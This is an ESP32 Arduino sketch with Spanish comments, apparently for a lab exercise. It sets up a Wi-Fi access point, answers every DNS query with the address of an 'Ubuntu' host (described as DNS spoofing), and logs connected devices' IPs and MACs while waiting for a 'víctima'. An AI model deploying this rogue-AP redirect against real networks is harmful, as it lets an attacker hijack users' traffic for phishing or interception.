#include <Arduino.h> // Obligatorio en PlatformIO
#include <WiFi.h>
#include <DNSServer.h> // Necesario para interceptar solicitudes DNS
#include "esp_wifi.h"  // Librería nativa para consultar la lista de estaciones (MACs)

const char *ssid = "ESP32_AP";
const char *password = "12345678";

// Puerto estándar para DNS
const byte DNS_PORT = 53;
DNSServer dnsServer;

// IP de Ubuntu
IPAddress ipUbuntu(192, 168, 4, 3);

// Configuración de red para el AP de la ESP32
IPAddress apIP(192, 168, 4, 1);
IPAddress netMask(255, 255, 255, 0);

// Variables para el control de tiempo y estado de estaciones
unsigned long lastScanTime = 0;
const unsigned long scanInterval = 3000; // Escanear cada 3 segundos
int lastConnectedCount = 0;

void mostrarDispositivosConectados()
{
  wifi_sta_list_t wifi_sta_list;
  tcpip_adapter_sta_list_t adapter_sta_list;

  memset(&wifi_sta_list, 0, sizeof(wifi_sta_list));
  memset(&adapter_sta_list, 0, sizeof(adapter_sta_list));

  // Obtiene las direcciones MAC de las estaciones conectadas
  esp_wifi_ap_get_sta_list(&wifi_sta_list);
  // Vincula esas MACs con las IPs asignadas por el DHCP interno
  tcpip_adapter_get_sta_list(&wifi_sta_list, &adapter_sta_list);

  int currentConnected = adapter_sta_list.num;

  // Detectar cambios en el número de conexiones para alertar de inmediato
  if (currentConnected != lastConnectedCount)
  {
    Serial.println("\n[!] CAMBIO DETECTADO EN LA RED [!]");
    if (currentConnected < lastConnectedCount)
    {
      Serial.printf("[-] Un dispositivo se ha DESCONECTADO. Equipos activos actuales: %d\n", currentConnected);
    }
    else
    {
      Serial.printf("[+] Un nuevo dispositivo se ha CONECTADO. Equipos activos actuales: %d\n", currentConnected);
    }
    lastConnectedCount = currentConnected;
  }

  // Si hay equipos conectados, listar sus datos técnicos
  if (currentConnected > 0)
  {
    Serial.println("--------------------------------------------------");
    Serial.printf(" LISTA DE ESTACIONES ASOCIADAS (%d dispositivo/s)\n", currentConnected);
    Serial.println("--------------------------------------------------");
    for (int i = 0; i < currentConnected; i++)
    {
      tcpip_adapter_sta_info_t station = adapter_sta_list.sta[i];

      // Conversión de la dirección IP nativa a formato legible string
      String ipStr = IPAddress(station.ip.addr).toString();

      // Formateo de la dirección MAC física
      char macStr[18];
      snprintf(macStr, sizeof(macStr), "%02X:%02X:%02X:%02X:%02X:%02X",
               station.mac[0], station.mac[1], station.mac[2],
               station.mac[3], station.mac[4], station.mac[5]);

      Serial.printf(" Dispositivo [%d] -> IP: %s | MAC: %s\n", i + 1, ipStr.c_str(), macStr);
    }
    Serial.println("--------------------------------------------------");
  }
  else
  {
    // Monitoreo silencioso si no hay nadie conectado
    static unsigned long lastEmptyMsg = 0;
    if (millis() - lastEmptyMsg > 15000)
    { // Mostrar aviso de red vacía cada 15 segundos para no saturar
      Serial.println("[*] Red vacía. Esperando conexiones de la víctima o atacante...");
      lastEmptyMsg = millis();
    }
  }
}

void setup()
{
  Serial.begin(115200);
  delay(100);

  // Configura el direccionamiento local de la ESP32
  WiFi.softAPConfig(apIP, apIP, netMask);
  WiFi.softAP(ssid, password);

  Serial.println("\n--- AP Levantado ---");
  Serial.print("SSID: ");
  Serial.println(ssid);
  Serial.print("IP del AP (Gateway): ");
  Serial.println(WiFi.softAPIP());

  // Intercepta CUALQUIER solicitud DNS (*) y respóndele con la IP de Ubuntu.
  dnsServer.start(DNS_PORT, "*", ipUbuntu);

  Serial.print("DNS Spoofing activo redirigiendo todo a Ubuntu: ");
  Serial.println(ipUbuntu);
  Serial.println("Monitor de estaciones iniciado con éxito.\n");
}

void loop()
{
  // Mantener el servidor DNS escuchando de manera prioritaria y fluida
  dnsServer.processNextRequest();

  // Control de tiempo no bloqueante (evita usar delay() largos que rompen el DNS)
  unsigned long currentTime = millis();
  if (currentTime - lastScanTime >= scanInterval)
  {
    mostrarDispositivosConectados();
    lastScanTime = currentTime;
  }
}